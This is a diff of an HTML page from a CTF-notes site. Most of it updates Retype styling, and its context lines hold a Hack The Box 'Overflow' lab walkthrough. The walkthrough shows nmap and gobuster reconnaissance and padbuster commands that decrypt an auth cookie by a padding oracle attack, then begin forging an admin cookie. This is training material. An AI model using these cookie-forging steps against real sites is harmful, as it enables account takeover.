@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769393205067">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.819170984352">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.5.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Overflow</title>
@@ -30,52 +30,52 @@
     <meta property="twitter:description" content="IP: 10.10.11.119">
     <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/overflow/images/overflow.png">
 
-    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.5.0.769393205067" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.819170984352" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.769393205067" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.819170984352" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
-                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
-                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">ctf-notes</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
-                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                            <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                         </g>
                                     </svg>
                                     <span>GitHub</span>
                                 </a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
                                             <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -96,7 +96,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -114,7 +114,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -124,26 +124,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
-                <!-- Render this div, if config.showSidebarFilter is `true` -->
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -153,23 +153,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
-                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                 </g>
                                             </svg>
                                             <span>GitHub</span>
                                         </a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
                                                     <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -183,7 +183,7 @@
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -191,14 +191,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="overflow" class="break-words">
     <h1>
@@ -207,7 +207,7 @@
     </h1>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/overflow.png" alt="">
+    <img src="images/overflow.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -225,7 +225,7 @@
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.119
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.119
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -239,7 +239,7 @@ PORT   STATE SERVICE
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p22,25,80 10.10.11.119 -o nmap.txt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p22,25,80 10.10.11.119 -o nmap.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 18:04 AWST
 Nmap scan report for 10.10.11.119
 Host is up (0.32s latency).
@@ -266,17 +266,17 @@ Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </doc-anchor-target>
 <p>Before we start digging into the machine I added the IP address to my <code v-pre>/etc/hosts</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">10.10.11.119    overflow.htb</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">10.10.11.119    overflow.htb</code></pre>
 </doc-codeblock></div>
 <p>Going to <a href="http://overflow.htb/">http://overflow.htb/</a> we see a website with only &quot;Sign In&quot; and &quot;Sign Up&quot; functionalities:
 <figure class="content-center">
-    <img src="images/image1.png" alt="">
+    <img src="images/image1.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>I first tried some default credentials but nothing works, so I registered a new user <code v-pre>caue:password</code>. The application automatically log me in as I sign up. Notice the redirect to <code v-pre>/home/index.php</code>, and other options are now available:
 <figure class="content-center">
-    <img src="images/image2.png" alt="">
+    <img src="images/image2.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -295,7 +295,7 @@ Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </doc-anchor-target>
 <p>Gobuster the root directory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$ gobuster dir -u http://overflow.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt
+<pre translate="no" class="language-none"><code v-pre class="language-none">$ gobuster dir -u http://overflow.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt
 
 ===============================================================
 /login.php            (Status: 200) [Size: 1878]
@@ -308,7 +308,7 @@ Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </doc-codeblock></div>
 <p>Gobuster the <code v-pre>/home</code> directory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$ gobuster dir -u http://overflow.htb/home -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt
+<pre translate="no" class="language-none"><code v-pre class="language-none">$ gobuster dir -u http://overflow.htb/home -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt
 
 ===============================================================
 /index.php            (Status: 302) [Size: 12503] [--&gt; ../login.php]
@@ -319,7 +319,7 @@ Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </doc-codeblock></div>
 <p>Accessing <code v-pre>/home/logs.php</code> we get &quot;Unauthorized!!&quot; message:
 <figure class="content-center">
-    <img src="images/image3.png" alt="">
+    <img src="images/image3.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -332,13 +332,13 @@ Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </doc-anchor-target>
 <p>Lets take a look at the cookies:
 <figure class="content-center">
-    <img src="images/image4.png" alt="">
+    <img src="images/image4.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Tried to decode the cookies but didn&#x27;t get any information back, it looks like there is some cipher behind it. However, modifying the cookie adding or removing characters, we get redirected and an error message:
 <figure class="content-center">
-    <img src="images/image5.png" alt="">
+    <img src="images/image5.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -350,7 +350,7 @@ We’ll use <em>padbuster</em> to attempt the padding oracle attack.</p>
 <p>Padbuster is a tool able to decrypt ciphertext, encrypt paintext, and perform analysis. In another words, it can decrypt the cookie and also generate a new cookie with the text provided. So first we need to know what is that cookie so we can generate an admin cookie.</p>
 <p>The original cookie from my screenshot seemed to have expired. I think there is some kind of database cleanup schedule running. So I registered a new account and extracted the cookie. Now we put this into our <em>padbuster</em> command:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ padbuster http://overflow.htb/login.php &quot;8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; 8 -cookie &quot;auth=8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; -encoding 0
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ padbuster http://overflow.htb/login.php &quot;8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; 8 -cookie &quot;auth=8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; -encoding 0
 
 +-------------------------------------------+
 | PadBuster - v0.3.3                        |
@@ -428,7 +428,7 @@ Block 2 Results:
 </doc-codeblock></div>
 <p>We have successfully decrypted the cookie! The cipher value is <code v-pre>user=caue</code>, which was the username registered. Now that we know the cipher value syntax, we’ll use <em>padbuster</em> to generate a new cipher for admin:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ padbuster http://overflow.htb/login.php &quot;8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; 8 -cookie &quot;auth=8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; -encoding 0 -plaintext &quot;user=admin&quot;
